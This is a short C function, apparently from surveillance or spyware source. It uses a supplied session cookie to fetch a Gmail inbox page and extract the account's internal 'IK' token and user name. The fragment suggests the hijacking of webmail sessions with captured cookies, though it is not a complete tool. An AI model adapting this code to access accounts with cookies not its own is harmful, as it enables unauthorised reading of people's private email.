DWORD GMailGetIK(LPSTR strCookie, LPSTR *strIKValue, LPWSTR *strCurrentUserName)
{
	*strIKValue = NULL;
	*strCurrentUserName = NULL;

	LPWSTR strURI = NULL;
	LPSTR  strRecvBuffer = NULL;
	DWORD  dwRet, dwBufferSize;

	strURI = (LPWSTR) zalloc(1024*sizeof(WCHAR));
	_snwprintf_s(strURI, 1024, _TRUNCATE, L"/mail/?shva=1#%s", L"inbox"); // FIXME ARRAY
	//_snwprintf_s(strURI, 1024, _TRUNCATE, L"/mail/u/0/?shva=1#%s", L"inbox"); // FIXME ARRAY
	dwRet = HttpSocialRequest(L"mail.google.com", L"GET", strURI, 443, NULL, 0, (LPBYTE *)&strRecvBuffer, &dwBufferSize, strCookie); // FIXME ARRAY
	zfree(strURI);

	if (dwRet != SOCIAL_REQUEST_SUCCESS)
	{
		zfree(strRecvBuffer);
		return dwRet;
	}

	if (!GMailParseForIK(strRecvBuffer, strIKValue, strCurrentUserName))
	{
#ifdef _DEBUG
		OutputDebug(L"[!] Could not PARSE for IK\n");
#endif
		zfree(strRecvBuffer);
		return SOCIAL_REQUEST_BAD_COOKIE;
	}

	return SOCIAL_REQUEST_SUCCESS;
}